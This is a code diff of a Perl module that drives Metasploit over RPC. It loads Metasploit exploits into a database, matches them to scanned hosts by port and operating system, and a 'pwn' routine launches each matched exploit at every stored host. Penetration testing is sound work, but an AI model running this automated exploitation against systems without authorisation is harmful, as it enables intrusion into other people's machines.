@@ -25,7 +25,30 @@ sub prepare {
     $self->MSFRPC( $self->Init->getModuleLoader->loadmodule("MSFRPC") );
     $self->DB( $self->Init->ml->getInstance("Database") );
     $self->Process( $self->Init->ml->module("Jobs")->tag("msfrpcd") )
-        if $self->Init->ml->module("Jobs")->tag("msfrpcd"); #If exist i load the process
+        if $self->Init->ml->module("Jobs")->tag("msfrpcd")
+        ;    #If exist i load the process
+
+    ## Adds the extractor to the DB to access special fields.
+    $self->DB->add_extractor(
+        Search::GIN::Extract::Callback->new(    ## Extract callback
+            extract => sub {
+                my ( $obj, $extractor, @args ) = @_;
+
+                ##### If it's an exploit add those to the index.
+                if ( $obj->isa("Resources::Models::Exploit") ) {
+                    return {
+                        default_rport => $obj->default_rport,
+                        RPORT         => $obj->RPORT,
+                        module        => $obj->module,
+
+                    };
+                }
+
+                return;
+            },
+        )
+    );
+
 }
 
 sub start() {
@@ -87,33 +110,33 @@ sub safe_database() {
 }
 
 sub LaunchExploitOnNode() {
-    my $self    = shift;
-    my $Node    = shift;
-    my $Exploit = shift;
- my $LaunchResult = $self->MSFRPC->exploit(
-         $Exploit->module,
-         {
-             ##   PAYLOAD=>undef,
-             ##   TARGET=>undef,
-             ##   ACTION=> undef,
+    my $self         = shift;
+    my $Node         = shift;
+    my $Exploit      = shift;
+    my $LaunchResult = $self->MSFRPC->exploit(
+        $Exploit->module,
+        {
+            ##   PAYLOAD=>undef,
+            ##   TARGET=>undef,
+            ##   ACTION=> undef,
 
-             RHOST => $Node->ip,
-             RPORT => $Exploit->RPORT || $Exploit->default_rport,
-             LHOST => $Exploit->LHOST || undef
+            RHOST => $Node->ip,
+            RPORT => $Exploit->RPORT
+                || $Exploit->default_rport,
+            LHOST => $Exploit->LHOST
+                || undef
 
+        }
+    );
 
-         }
-     );
+    if ( $LaunchResult == 1 ) {
+        $self->Init->io->info("Exploit successful");
+    }
 
- if($LaunchResult==1) {
-    $self->Init->io->info("Exploit successful");
- }
-  
+    # $self->MSFRPC->console_write("jobs");
 
-   # $self->MSFRPC->console_write("jobs");
-
-#sleep 4;    
-#$self->Init->io->debug_dumper( $self->MSFRPC->console_read() );
+    #sleep 4;
+    #$self->Init->io->debug_dumper( $self->MSFRPC->console_read() );
 
     #  my $LaunchResult = $self->MSFRPC->execute(
     #      $Exploit->type,
@@ -149,8 +172,6 @@ sub LaunchExploitOnNode() {
 
 }
 
-
-
 sub event_Resources__Exploit {
     my $self = shift;
     $self->Init->io->debug("Exploit generated correctly!");
@@ -171,13 +192,13 @@ sub is_avaible() {
     my $self = shift;
     while ( $self->Process->is_running ) {
         sleep 5;
-        $self->Init->io->info("waiting for meta");
+        $self->Init->io->info("waiting for meta and retrying");
 
         if ( $self->is_up ) {
             last;
         }
         else {
-            $self->Init->io->error("meta doesn't answer yet");
+            $self->Init->io->info("meta doesn't answer yet");
 
         }
     }
@@ -188,8 +209,8 @@ sub is_up() {
     my $self = shift;
     if ( $self->MSFRPC ) {
         my $MSFRPC   = $self->MSFRPC;
-        my $response = $MSFRPC->call('module.exploits');
-        if ( exists( $response->{'modules'} ) ) {
+        my $response = $MSFRPC->call('core.version');
+        if ( exists( $response->{'version'} ) ) {
             return 1;
         }
     }
@@ -214,11 +235,10 @@ sub populateDB() {
     $IO->print_alert("Syncing db with msf exploits, this can take a while");
     $IO->print_info(
         "There are " . scalar(@EXPL_LIST) . " exploits in metasploit" );
-    my $result = $DB->search( { class => "Resources::Models::Exploit" } );
     my $Counter = 0;
     foreach my $exploit (@EXPL_LIST) {
         my $result = $DB->search( { module => $exploit } );
-        if ( $result == 0 or $result->next ) {
+        if ( !defined($result) or $result->items == 0 ) {
             $IO->debug("Adding $exploit to Exploit DB");
             my $Information = $MSFRPC->info( "exploits", $exploit );
             my $Options = $MSFRPC->options( "exploits", $exploit );
@@ -238,18 +258,18 @@ sub populateDB() {
                 name          => $Information->{'name'},
                 targets       => \@Targets,
                 references    => \@References,
-                default_rport => $Options->{'RPORT'}->{'default'}
+                default_rport => $Options->{'RPORT'}->{'default'},
+                RPORT         => $Options->{'RPORT'}->{'default'}
             );
-            $IO->debug( "adding " . $exploit );
+            $IO->info( "adding " . $exploit );
 
             $DB->add($Expl);
             $Counter++;
         }
         else {
-            $IO->debug("Exploit already in the database");
+            $IO->info("Exploit already in the database");
         }
     }
-
     $IO->print_info(" $Counter added");
 }
 
@@ -259,9 +279,9 @@ sub test() {
     $self->LaunchExploitOnNode(
         Resources::Models::Node->new( ip => "127.0.0.1" ),
         Resources::Models::Exploit->new(
-            type   => "exploits",
-            module => "windows/misc/ib_isc_attach_database",
-            default_rport=>9090
+            type          => "exploits",
+            module        => "windows/misc/ib_isc_attach_database",
+            default_rport => 9090
         )
     );
 
@@ -287,39 +307,46 @@ sub matchExpl() {
 
 }
 
-sub pwn(){
-    my $self=shift;
-    my $host=shift || undef;
+sub pwn() {
+    my $self = shift;
+    my $host = shift || undef;
     my @Hosts;
-    if($host){
+    if ($host) {
         my $results = $self->Init->ml->getInstance("Database")
             ->search( { ip => $host } );
         my $DBHost;
         while ( my $chunk = $results->next ) {
             for my $foundhost (@$chunk) {
-                       push(@Hosts,$foundhost);
+                push( @Hosts, $foundhost );
                 last;
             }
         }
-    } else {
-              my $results = $self->Init->ml->getInstance("Database")
-            ->search(  { class => "Resources::Models::Node" } );
+    }
+    else {
+        my $results = $self->Init->ml->getInstance("Database")
+            ->search( { class => "Resources::Models::Node" } );
         my $DBHost;
         while ( my $chunk = $results->next ) {
             for my $foundhost (@$chunk) {
-                       push(@Hosts,$foundhost);
+                push( @Hosts, $foundhost );
             }
         }
 
     }
+    $self->Init->io->info( "Found " . @Hosts . " to attack" );
     $self->is_avaible;
-    foreach my $Node(@Hosts){
-        foreach my $PotentialExploit($Node->attachments->members){
-            next if !$PotentialExploit->isa("Resources::Models::Exploit");
-            $self->LaunchExploitOnNode(
-                $Node,
-                $PotentialExploit
-            );  
+    foreach my $Node (@Hosts) {
+        {
+            my $scope = $self->DB->new_scope()
+                ;    #KiokuDB needs that for accessing at attachments
+            foreach my $PotentialExploit ( $Node->attachments->members ) {
+                next if !$PotentialExploit->isa("Resources::Models::Exploit");
+                $self->Init->io->info( "Trying "
+                        . $PotentialExploit->module . " on "
+                        . $Node->ip );
+
+                $self->LaunchExploitOnNode( $Node, $PotentialExploit );
+            }
         }
     }
 }
@@ -335,15 +362,17 @@ sub matchNode() {
         foreach my $expl (
             ( $self->matchExpl($service), $self->matchPort($porta) ) )
         {
+            next if !$expl->targets;
             $self->Init->getIO->print_info(
-                "Exploit targets: " . join( " ", @{ $expl->targets } ) );
+                "Exploit targets: " . join( "\t", @{ $expl->targets } ) );
             foreach my $target ( @{ $expl->targets } ) {
                 my $os = $Node->os;
                 if ( $Node->os =~ /embedded/ ) {
                     $os = "linux";
                 }    #it's a good assumption, i know
                 if ( $target =~ /$os/i or $target =~ /Automatic/ ) {
-                    $self->Init->getIO->print_info("$target match");
+
+                    #  $self->Init->getIO->print_info("$target match");
                     $Node->attachments->insert($expl);
                     last;
                 }
@@ -357,8 +386,9 @@ sub matchPort() {
     my $self   = shift;
     my $String = shift;
     my $Objs   = $self->DB->search( { default_rport => $String } );
+    return [] if ( !$Objs );
     $self->Init->getIO->print_tabbed(
-        "Searching a matching exploit for port $String", 3 );
+        "Found " . $Objs->items . " matching exploit for port $String", 3 );
     my @Return;
     while ( my $chunk = $Objs->next ) {
         for my $item (@$chunk) {
@@ -372,7 +402,7 @@ sub matchPort() {
 }
 
 sub sessionlist() {
-    my $self    = shift;
+    my $self = shift;
     $self->MSFRPC->call("session.list");
 }
 
